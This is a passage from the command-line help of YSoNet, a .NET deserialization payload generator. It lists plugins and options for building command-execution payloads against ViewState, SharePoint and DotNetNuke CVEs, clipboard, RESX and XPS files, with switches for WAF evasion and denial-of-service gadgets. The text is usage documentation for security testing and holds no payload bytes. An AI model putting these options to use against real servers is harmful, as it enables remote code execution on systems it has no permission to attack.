			                               setter on a type it builds, and XmlNode.Value
			                               throws whatever you give it, so the read dies
			                               before the parse. That is a limit of the
			                               target's library version, not of the payload,
			                               and it applies to both variants on those two
			                               formatters.
			                               Default value: "1".
			                               Suggested values: 1, 2.
			      --rawinput             Skip the URL validation and put -c into the DTD
			                               external identifier exactly as typed, with no
			                               trimming. Normal mode accepts an absolute http
			                               or https URL and refuses whitespace, control
			                               characters and the characters " < > \, because
			                               the value goes inside a QUOTED DTD external
			                               identifier and those would corrupt or escape it.
			                               Use this only for research on a resolver that
			                               accepts something else; the network effect this
			                               gadget declares was proven with http(s). It does
			                               NOT turn off the outer formatter's escaping, so
			                               the payload is still a valid document - but
			                               nothing checks that the identifier inside it
			                               still is, and a broken one simply fetches
			                               nothing.
			                               Default value: "false".

			Categories [variant 1]:
			  Kind: Network
			  Formatter: FastJson, JavaScriptSerializer, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml, YamlDotNet
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.5.1
			Categories [variant 2]:
			  Kind: Network
			  Formatter: JavaScriptSerializer, MessagePackTypeless, MessagePackTypelessLz4, SharpSerializerBinary, SharpSerializerXml, Xaml
			  Accepted input: Remote URL
			  Requirements: .NET Framework, Built in
			  Runtime versions: .NET Framework 4.0 - 4.8.1

== PLUGINS ==
	(*) ActivatorUrl (Sends a generated payload to an activated, presumably remote, object)
		Runtime versions: Unspecified
		Options:
		  -c, --command=VALUE        the command to be executed.
		                               Required.
		  -u, --url=VALUE            the url passed to Activator.GetObject.
		                               Required.
		  -s                         if TCPChannel security should be enabled.
		                               Default value: "false".

	(*) Altserialization (Generates payload for HttpStaticObjectsCollection or SessionStateItemCollection)
		Runtime versions: .NET Framework 2.0 - 4.8.1
		Options:
		  -M, --mode=VALUE           the payload mode: HttpStaticObjectsCollection or
		                               SessionStateItemCollection. Default:
		                               HttpStaticObjectsCollection
		                               Suggested values: HttpStaticObjectsCollection,
		                               SessionStateItemCollection.
		  -o, --output=VALUE         the output format (raw|base64).
		                               Suggested values: raw, base64.
		  -c, --command=VALUE        the command to be executed
		                               Required.
		  -g, --gadget=VALUE         a gadget chain that supports BinaryFormatter.
		                               Leave it empty to use the gadget each mode has
		                               always used: TextFormattingRunProperties for
		                               HttpStaticObjectsCollection, TypeConfuseDelegate
		                               for SessionStateItemCollection.
		                               Values: see --list gadgets.
		  -t, --test                 whether to run payload locally. Default: false
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Default: false
		      --ust, --usesimpletype This is to remove additional info only when
		                               minifying and FormatterAssemblyStyle=Simple.
		                               Default: true
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".
		      --legacyfx             Target the .NET Framework 2.0/3.0/3.5 (CLR v2)
		                               generation. This reaches the GADGET only; both
		                               wire frames this plugin writes name no framework
		                               assembly, so they need no rewriting. Default:
		                               false
		      --i-understand-dos     Acknowledge that a denial-of-service gadget can
		                               disrupt or terminate the target process. It is
		                               required to generate one and is not needed by
		                               any other gadget.
		                               Default value: "false".

	(*) ApplicationTrust (Generates XML payload for the ApplicationTrust class)
		Runtime versions: .NET Framework 2.0 - 4.8.1
		Options:
		  -c, --command=VALUE        the command to be executed
		                               Required.
		  -g, --gadget=VALUE         a gadget chain that supports BinaryFormatter.
		                               Default: TextFormattingRunProperties.
		                               Default value: "TextFormattingRunProperties".
		                               Values: see --list gadgets.
		  -t, --test                 whether to run payload locally. Default: false
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Default: false
		      --ust, --usesimpletype This is to remove additional info only when
		                               minifying and FormatterAssemblyStyle=Simple.
		                               Default: true
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".
		      --legacyfx             Target the .NET Framework 2.0/3.0/3.5 (CLR v2)
		                               generation. This reaches the GADGET only; this
		                               plugin's own XML envelope names no framework
		                               assembly, so it needs no rewriting. Default:
		                               false
		      --no-comment           Output only the serialized payload, without the
		                               explanatory XML comment.
		                               Default value: "false".
		      --i-understand-dos     Acknowledge that a denial-of-service gadget can
		                               disrupt or terminate the target process. It is
		                               required to generate one and is not needed by
		                               any other gadget.
		                               Default value: "false".

	(*) Clipboard (Generates payload for DataObject and copies it into the clipboard - ready to be pasted in affected apps)
		Runtime versions: Unspecified
		Options:
		  -m, --mode=VALUE           delivery mode (default: winforms). 'winforms': a
		                               BinaryFormatter gadget under a WinForms format
		                               (see --format). 'wpfxaml': an ObjectDataProvider
		                               XAML string under the WPF 'Xaml' format, for
		                               InkCanvas/RichTextBox paste; fires only if the
		                               target enabled the legacy clipboard switch or
		                               predates the CVE-2020-0605/0606 mitigation (see
		                               the header comment for details).
		                               Suggested values: winforms, wpfxaml.
		  -F, --format=VALUE         winforms mode only. The object format: Csv,
		                               DeviceIndependentBitmap, DataInterchangeFormat,
		                               PenData, RiffAudio,
		                               WindowsForms10PersistentObject, System.String,
		                               SymbolicLink, TaggedImageFileFormat, WaveAudio.
		                               Default: WindowsForms10PersistentObject (the
		                               only one that works in Feb 2020 as a result of
		                               an incomplete silent patch - will not be useful
		                               to target text-based fields anymore)
		                               Suggested values: Csv, DeviceIndependentBitmap,
		                               DataInterchangeFormat, PenData, RiffAudio,
		                               WindowsForms10PersistentObject, System.String,
		                               SymbolicLink, TaggedImageFileFormat, WaveAudio.
		      --xamlvariant=VALUE    wpfxaml mode only. ObjectDataProvider XAML
		                               variant: 1 = bare ObjectDataProvider, 2 =
		                               ResourceDictionary wrapper (looks like real
		                               clipboard XAML). Default: 2
		                               Default value: "2".
		                               Suggested values: 1, 2.
		  -c, --command=VALUE        the command to be executed
		                               Required.
		  -t, --test                 whether to run payload locally. In wpfxaml mode
		                               this simulates the WPF paste path (restrictive
		                               vs legacy) and runs the command if it fires.
		                               Default: false
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Default: false
		      --ust, --usesimpletype This is to remove additional info only when
		                               minifying and FormatterAssemblyStyle=Simple.
		                               Default: true
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".

	(*) DotNetNuke (Generates payload for DotNetNuke CVE-2017-9822)
		Runtime versions: Unspecified
		Options:
		  -m, --mode=VALUE           the payload mode: read_file, write_file,
		                               run_command.
		                               Suggested values: read_file, write_file,
		                               run_command.
		                               Required.
		  -c, --command=VALUE        the command to be executed in run_command mode.
		  -u, --url=VALUE            the url to fetch the file from in write_file
		                               mode.
		  -f, --file=VALUE           the file to read in read_file mode or the file
		                               to write to in write_file mode.
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Default: false
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".

	(*) GetterCallGadgets (Implements arbitrary getter call gadgets for .NET Framework and .NET 5/6/7 with WPF enabled, run with -l for more help)
		Runtime versions: Unspecified
		Options:
		  -l                         prints list of implemented gadgets
		                               Default value: "false".
		  -i, --inner=VALUE          file containing inner-gadget
		                               Required.
		  -g, --gadget=VALUE         gadget to use
		                               Required.
		  -m, --member=VALUE         getter to call (required for some gadgets)
		  -t                         test gadget (execute)
		                               Default value: "false".
		      --minify               minify gadget
		                               Default value: "false".

	(*) MachineKeySessionSecurityTokenHandler (Generates XML payload for the MachineKeySessionSecurityTokenHandler class)
		Runtime versions: Unspecified
		Options:
		  -c, --command=VALUE        the command to be executed e.g. "cmd /c calc"
		                               Required.
		  -t, --test                 In this scenario, the test mode should not be
		                               applied, as the sink point relies on the web
		                               environment. Default: false
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Default: false
		      --ust, --usesimpletype This is to remove additional info only when
		                               minifying and FormatterAssemblyStyle=Simple.
		                               Default: true
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".
		      --vk, --validationkey=VALUE
		                             Enter the validationKey from the web.config
		                               Required.
		      --ek, --decryptionkey=VALUE
		                             Enter the decryptionKey from the web.config
		                               Required.
		      --va, --validationalg=VALUE
		                             Enter the validation from the web.config.
		                               Default: HMACSHA1. e.g:
		                               HMACSHA1/HMACSHA256/HMACSHA384/ HMACSHA512
		      --da, --decryptionalg=VALUE
		                             Enter the decryption from the web.config.
		                               Default: AES. e.g: AES/DES/3DES

	(*) Resx (Generates RESX and .RESOURCES files)
		Runtime versions: .NET Framework 2.0 - 4.8.1
		Options:
		  -M, --mode=VALUE           the payload mode: indirect_resx_file,
		                               CompiledDotResources (useful for CVE-2020-0932
		                               for example), BinaryFormatter, SoapFormatter.
		                               Suggested values: indirect_resx_file,
		                               CompiledDotResources, BinaryFormatter,
		                               SoapFormatter.
		                               Required.
		  -c, --command=VALUE        the command to be executed in BinaryFormatter
		                               and CompiledDotResources. If this is provided
		                               for SoapFormatter, it will be used as a file for
		                               ActivitySurrogateSelectorFromFile
		  -g, --gadget=VALUE         The gadget chain used for BinaryFormatter and
		                               CompiledDotResources (default:
		                               TextFormattingRunProperties).
		                               Values: see --list gadgets.
		  -F, --file=VALUE           UNC file path location: this is used in
		                               indirect_resx_file mode.
		      --type=VALUE           indirect_resx_file mode only: the type name the
		                               TARGET resolves with Type.GetType when it
		                               converts the file reference, which is what
		                               decides the effect. Default: System.Resource-
		                               s.ResXResourceSet, System.Windows.Forms,
		                               Version=4.0.0.0, Culture=neutral,
		                               PublicKeyToken=b77a5c561934e089, whose Stream
		                               constructor reads the file as a .resources
		                               document. System.String makes the target read
		                               the file back as text instead, and any other
		                               type with a public constructor taking one Stream
		                               is activated with the file's bytes.
		                               Default value: "System.Resources.ResXResourceSe-
		                               t, System.Windows.Forms, Version=4.0.0.0,
		                               Culture=neutral,
		                               PublicKeyToken=b77a5c561934e089".
		      --enc=VALUE            indirect_resx_file mode only: the encoding name
		                               the target passes to Encoding.GetEncoding, used
		                               only when --type is System.String. Omitted by
		                               default, which makes the target use Encodin-
		                               g.Default.
		      --of, --outputfile=VALUE
		                             a file path location for CompiledDotResources to
		                               store the .resources file (default: payloa-
		                               d.resources)
		  -t, --test                 Whether to run payload locally. Default: false
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Default: false
		      --ust, --usesimpletype This is to remove additional info only when
		                               minifying and FormatterAssemblyStyle=Simple.
		                               Default: true
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".
		      --legacyfx             Target the .NET Framework 2.0/3.0/3.5 (CLR v2)
		                               generation. This reaches the GADGET only. The-
		                                .resx reader/writer headers remain at 4.0.0.0
		                               because ResXResourceReader treats them as
		                               descriptive metadata; the complete document is
		                               tested on CLR v2. Default: false
		      --i-understand-dos     Acknowledge that a denial-of-service gadget can
		                               disrupt or terminate the target process. It is
		                               required to generate one and is not needed by
		                               any other gadget.
		                               Default value: "false".

	(*) SessionSecurityTokenHandler (Generates XML payload for the SessionSecurityTokenHandler class)
		Runtime versions: Unspecified
		Options:
		  -c, --command=VALUE        the command to be executed e.g. "cmd /c calc"
		                               Required.
		  -t, --test                 whether to run payload locally. Default: false
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Default: false
		      --ust, --usesimpletype This is to remove additional info only when
		                               minifying and FormatterAssemblyStyle=Simple.
		                               Default: true
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".

	(*) SharePoint (Generates payloads for the following SharePoint CVEs: CVE-2026-50522, CVE-2025-53770, CVE-2025-49704, CVE-2024-38018, CVE-2020-1147, CVE-2019-0604, CVE-2018-8421)
		Runtime versions: Unspecified
		Options:
		      --cve=VALUE            the CVE reference: CVE-2026-50522, CVE-2025-
		                               53770, CVE-2025-49704, CVE-2024-38018, CVE-2020-
		                               1147, CVE-2019-0604, CVE-2018-8421
		                               Suggested values: CVE-2026-50522, CVE-2025-5377-
		                               0, CVE-2025-49704, CVE-2024-38018, CVE-2020-114-
		                               7, CVE-2019-0604, CVE-2018-8421.
		                               Required.
		      --useurl               to use the XAML url rather than using the direct
		                               command in CVE-2019-0604 and CVE-2018-8421
		                               Default value: "false".
		  -g, --gadget=VALUE         a gadget chain for CVE-2020-1147 (LosFormatter)
		                               or CVE-2024-38018 / CVE-2026-50522
		                               (BinaryFormatter). Default: TypeConfuseDelegate
		                               Values: see --list gadgets.
		  -c, --command=VALUE        the command to be executed e.g. "cmd /c calc" or
		                               the XAML url e.g. "http://example.local/x" to
		                               make the payload shorter with the `--useurl`
		                               argument
		                               Required.
		      --target=VALUE         for CVE-2026-50522: the absolute SharePoint base
		                               URL used as the wctx value. Required with --
		                               formbody; on the default token output it only
		                               fills the delivery comment's wctx example. It is
		                               NOT contacted.
		      --formbody             CVE-2026-50522 only: emit the full URL-encoded
		                               wa/wctx/wresult form body ready to POST, instead
		                               of just the wresult token. Requires --target.
		                               Default value: "false".
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Applies to the
		                               BinaryFormatter/LosFormatter gadget CVEs.
		                               Default: false
		      --ust, --usesimpletype This is to remove additional info only when
		                               minifying and FormatterAssemblyStyle=Simple.
		                               Default: true
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".
		      --no-comment           Output only the serialized payload or form body,
		                               without the trailing explanatory HTML comment.
		                               Default value: "false".
		      --var, --variant=VALUE Variant number for CVE-2025-49704 only. Choices:
		                               1 (default, uses DataSetOldBehaviourGenerator
		                               variant 2), 2 (uses
		                               DataSetOldBehaviourFromFileGenerator variant 2)
		                               Default value: "1".
		                               Suggested values: 1, 2.
		      --spver=VALUE          CVE-2024-38018 only: which SharePoint generation
		                               to target. Choices: 2019 (default), 2016, 2013.
		                               2016 and 2019 share the same assembly identity
		                               and produce the same payload; 2013 uses
		                               LosFormatter and the 15.0.0.0 assembly referenc-
		                               e.
		                               Default value: "2019".
		                               Suggested values: 2019, 2016, 2013.
		      --i-understand-dos     Acknowledge that a denial-of-service gadget can
		                               disrupt or terminate the target process. It is
		                               required to generate one and is not needed by
		                               any other gadget.
		                               Default value: "false".

	(*) ThirdPartyGadgets (Implements gadgets for 3rd Party Libraries)
		Runtime versions: Unspecified
		Options:
		  -l                         prints list of implemented gadgets
		                               Default value: "false".
		  -i, --input=VALUE          input to the gadget
		                               Required.
		  -g, --gadget=VALUE         gadget to use
		                               Required.
		  -f, --formatter=VALUE      formatter to use
		                               Required.
		      --rawinput             pass the input verbatim into the JSON template
		                               instead of JSON-escaping it. By default a
		                               backslash/quote in the input is escaped so a
		                               natural path like \\host\share works; use this
		                               only when you need to supply already-escaped or
		                               literal JSON.
		                               Default value: "false".
		  -r                         removes version and pubkeytoken from types, it
		                               may be useful when we do not know the version of
		                               targeted library or require a short payload
		                               Default value: "false".
		  -t                         test gadget (execute after generation)
		                               Default value: "false".
		      --minify               minify gadget
		                               Default value: "false".

	(*) TransactionManagerReenlist (Generates payload for the TransactionManager.Reenlist method)
		Runtime versions: .NET Framework 2.0 - 4.8.1
		Options:
		  -c, --command=VALUE        the command to be executed
		                               Required.
		  -g, --gadget=VALUE         a gadget chain that supports BinaryFormatter.
		                               Default: TextFormattingRunProperties.
		                               Default value: "TextFormattingRunProperties".
		                               Values: see --list gadgets.
		  -t, --test                 whether to run payload locally. Default: false
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Default: false
		      --ust, --usesimpletype This is to remove additional info only when
		                               minifying and FormatterAssemblyStyle=Simple.
		                               Default: true
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".
		      --legacyfx             Target the .NET Framework 2.0/3.0/3.5 (CLR v2)
		                               generation. This reaches the GADGET only; this
		                               plugin's own 5-byte frame names no framework
		                               assembly, so it needs no rewriting. Default:
		                               false
		      --i-understand-dos     Acknowledge that a denial-of-service gadget can
		                               disrupt or terminate the target process. It is
		                               required to generate one and is not needed by
		                               any other gadget.
		                               Default value: "false".

	(*) ViewState (Generates a ViewState using known MachineKey parameters)
		Runtime versions: .NET Framework 2.0 - 4.8.1
		Options:
		      --examples             Show a few examples. Other parameters will be
		                               ignored.
		                               Default value: "false".
		      --dryrun               Create a valid ViewState without using an
		                               exploit payload. The gadget and command
		                               parameters will be ignored.
		                               Default value: "false".
		  -g, --gadget=VALUE         A gadget chain that supports LosFormatter.
		                               Default: TextFormattingRunProperties.
		                               Default value: "TextFormattingRunProperties".
		                               Values: see --list gadgets.
		  -c, --command=VALUE        The command suitable for the used gadget. A few
		                               gadgets ignore it and run a fixed payload
		                               instead - ActivitySurrogateSelector is the one
		                               you are most likely to pick - and for those any
		                               placeholder works.
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".
		  -s, --stdin                The command to be executed will be read from
		                               standard input (the first line, up to 2,050
		                               bytes). A non-empty command wins.
		                               Default value: "false".
		      --usp, --unsignedpayload=VALUE
		                             The unsigned LosFormatter payload (base64
		                               encoded). The gadget and command parameters will
		                               be ignored.
		      --isfileusp            Indicates that the unsigned payload contains a
		                               file name (e.g., payload.txt).
		                               Default value: "false".
		      --vsg, --generator=VALUE
		                             The __VIEWSTATEGENERATOR value in HEX, useful
		                               for .NET <= 4.0. When not empty, 'legacy' will
		                               be used and 'path' and 'apppath' will be ignored.
		      --path=VALUE           The target web page (optional; only used to
		                               compute the __VIEWSTATEGENERATOR when
		                               'generator' is not given). Example:
		                               /app/folder1/page.aspx.
		      --pathisclass          Indicates that the path is a class name and
		                               should not be modified.
		                               Default value: "false".
		      --apppath=VALUE        The IIS application path (optional; used to
		                               simulate TemplateSourceDirectory). Example:
		                               /myapp/. Leave empty for the site root.
		      --islegacy             Use the legacy algorithm suitable for .NET 4.0
		                               and below.
		                               Default value: "false".
		      --isencrypted          Use when the legacy algorithm is used to bypass
		                               WAFs.
		                               Default value: "false".
		      --vsuk, --VSUK, --viewstateuserkey, --ViewStateUserKey=VALUE
		                             Sets the ViewStateUserKey parameter, sometimes
		                               used as the anti-CSRF token.
		      --da, --DA, --decryptionalg, --DecryptionAlg=VALUE
		                             The encryption algorithm can be set to DES, 3DE-
		                               S, or AES. Default: AES.
		                               Suggested values: DES, 3DES, AES.
		      --dk, --DK, --decryptionkey, --DecryptionKey=VALUE
		                             The decryptionKey attribute from machineKey.
		                               Only needed when encryption is used (for example
		                               with 'isencrypted').
		      --va, --VA, --validationalg, --ValidationAlg=VALUE
		                             The validation algorithm can be set to SHA1,
		                               HMACSHA256, HMACSHA384, HMACSHA512, MD5, 3DES,
		                               or AES. Default: HMACSHA256.
		                               Suggested values: SHA1, HMACSHA256, HMACSHA384,
		                               HMACSHA512, MD5, 3DES, AES.
		      --vk, --VK, --validationkey, --ValidationKey=VALUE
		                             The validationKey attribute from machineKey in
		                               the web.config file.
		                               Required.
		      --cv, --currentviewstate=VALUE
		                             To validate and decrypt the provided viewstate
		                               value if it has been encrypted.
		      --showraw              Stop URL-encoding the result. Default: false.
		      --minify               Minify the payloads where applicable
		                               (experimental). Default: false.
		      --ust, --usesimpletype Remove additional info only when minifying and
		                               FormatterAssemblyStyle=Simple. Default: true.
		      --osf, --objectstateformatter
		                             This is to simulate ObjectStateFormatter with a
		                               MAC encoding key on its own.
		                               Default value: "false".
		      --mk, --mackey=VALUE   The ObjectStateFormatter MAC encoding key in
		                               base64. Only used with the 'osf' option.
		      --isdebug              Show useful debugging messages.
		                               Default value: "false".
		      --legacyfx             Target the .NET Framework 2.0/3.0/3.5 (CLR v2)
		                               generation. This reaches the GADGET only; the
		                               ViewState envelope and its signature name no
		                               framework assembly. Pair it with 'islegacy',
		                               which selects the matching pre-4.5 signing
		                               algorithm. Default: false
		      --i-understand-dos     Acknowledge that a denial-of-service gadget can
		                               disrupt or terminate the target process. It is
		                               required to generate one and is not needed by
		                               any other gadget.
		                               Default value: "false".

	(*) Xps (Generates a malicious XPS document (CVE-2020-0605) for XpsDocument or PrintQueue.AddJob(path) - binary output, use --outputpath to save it as an .xps file)
		Runtime versions: Unspecified
		Options:
		  -m, --mode=VALUE           which markup part carries the payload: 'fdseq'
		                               (default, the FixedDocumentSequence start part),
		                               'fdoc' (the FixedDocument part), 'fpage' (the
		                               FixedPage part), or 'all'. The parts were
		                               patched at different times, so this chooses what
		                               a given target build still parses unrestricted.
		                               Default value: "fdseq".
		                               Suggested values: fdseq, fdoc, fpage, all.
		  -c, --command=VALUE        the command to be executed
		                               Required.
		  -t, --test                 whether to run the payload locally. This opens
		                               the generated document twice: once with the
		                               patched default (must be blocked) and once with
		                               the legacy switches flipped FOR THIS PROCESS
		                               ONLY, which runs your command. Default: false
		      --minify               Whether to minify the payloads where applicable
		                               (experimental). Default: false
		      --ust, --usesimpletype This is to remove additional info only when
		                               minifying and FormatterAssemblyStyle=Simple.
		                               Default: true
		      --rawcmd               Command will be executed as is without `cmd /c `
		                               being appended (anything after the first space
		                               is an argument).
		                               Default value: "false".


Note: Machine authentication code (MAC) key modifier is not being used for LosFormatter in YSoNet. Therefore, LosFormatter (base64 encoded) can be used to create ObjectStateFormatter payloads.

Usage: ysonet.exe [options]
Options:
  -p, --plugin=VALUE         The plugin to be used.
  -o, --output=VALUE         The output format (raw|base64|raw-
                               urlencode|base64- urlencode|hex).
                               Suggested values: raw, base64, raw-urlencode,
                               base64-urlencode, hex.
  -g, --gadget=VALUE         The gadget chain.
  -f, --formatter=VALUE      The formatter.
  -c, --command=VALUE        The command to be executed.
      --rawcmd               Command will be executed as is without `cmd /c `
                               being appended (anything after first space is an
                               argument).
  -s, --stdin                The command to be executed will be read from
                               standard input (the first line, up to 2,050
                               bytes). A non-empty -c wins.
      --bgc, --bridgedgadgetchains=VALUE
                             Chain of bridged gadgets separated by comma (,).
                               Each gadget will be used to complete the next
                               bridge gadget. The last one will be used in the
                               requested gadget. This will be ignored when
                               using the searchformatter argument.
  -t, --test                 Test locally. With --legacyfx, use the
                               separately shipped .NET Framework 3.5 / CLR2
                               process; otherwise use ysonet's current CLR4
                               process. Default: false
      --testclr2             Test locally in the separately shipped .NET
                               Framework 3.5 / CLR2 process. Supports
                               BinaryFormatter, LosFormatter, and SoapFormatte-
                               r. Default: false
      --outputpath=VALUE     The output file path. It will be ignored if
                               empty.
      --minify               Minify payloads where applicable. A gadget may
                               refuse --minify when it would rewrite operator
                               data whose characters or bytes must survive
                               exactly. Default: false
      --ust, --usesimpletype This is to remove additional info only when
                               minifying and FormatterAssemblyStyle=Simple
                               (always `true` with `--minify` for binary
                               formatters). Default: true
      --legacyfx             Target the .NET Framework 2.0/3.0/3.5 (CLR v2)
                               generation. The shared transform rewrites
                               framework assembly versions; gadgets that carry
                               source may also use the CLR-v2 compiler, and a
                               gadget may author a type's older assembly
                               identity when it moved between CLR generations.
                               The graph and your input are untouched. It is
                               not proof that every gadget works there.
                               Default: false
      --raf, --runallformatters
                             Try every listed non denial-of-service gadget
                               whose formatter name contains the given text.
                               Requires -f plus -c or -s, and cannot be
                               combined with -g or -p. Uses each formatter's
                               default output format, ignores -o, -t, and --
                               testclr2, prints payloads with their length, and
                               reports per-payload failures plus a summary on
                               stderr. Default: false
      --sf, --searchformatter=VALUE
                             Search in all formatters to show relevant
                               gadgets and their formatters (other parameters
                               will be ignored).
      --list=VALUE           Print discovery data and exit (line lists, or
                               JSON for catalog/catalog-schema). Categories:
                               gadgets|plugins|formatters|options|
                               outputs|values|value-options|catalog| catalog-
                               schema. The catalog category emits versioned
                               JSON. Add -g <gadget> to list that gadget's
                               formatters/options, or -p <plugin> to list that
                               plugin's options. Useful for shell tab-
                               completion scripts.
                               Suggested values: gadgets, plugins, formatters,
                               options, outputs, values, value-options, catalo-
                               g, catalog-schema.
      --option=VALUE         Option name whose declared values to print with -
                               -list values (combine with -g or -p).
      --category=VALUE       Find gadgets by category (repeatable): --
                               category=axis=value where axis is
                               kind|formatter|input|requirement| version.
                               Repeat for OR within an axis and AND across axe-
                               s. A version is an exact runtime build (4.8.1, -
                               5.0, mono) and only lists gadgets recorded as
                               working there. Alone it prints matching gadgets
                               and their categories; with '--list gadgets' it
                               prints matching names only. Example: --
                               category=kind=code-execution --
                               category=formatter=Json.NET
      --debugmode            Enable debugging to show exception errors and
                               output length
      --i-understand-dos     Acknowledge that a denial-of-service gadget can
                               disrupt or terminate the target process. It is
                               required to generate one and is not needed by
                               any other gadget.
  -h, --help                 Show the quick guide or selected-module help and
                               exit.
      --fullhelp             Show all gadgets, plugins, and global options,
                               or selected-module help, and exit.
      --prv, --display-private
                             Also list private gadgets and plugins in --
                               fullhelp, --credit, --list, --sf, --raf, --
                               category and interactive mode. They always build
                               when named on the command line; this only shows
                               them in listings.
      --credit               Shows the credit/history of gadgets and plugins
                               (other parameters will be ignored).
      --checkupdate          Check GitHub for a newer YSoNet release and exit.
      --runmytest            Runs that `Start` method of `TestingArenaHome` -
                               useful for testing and debugging.
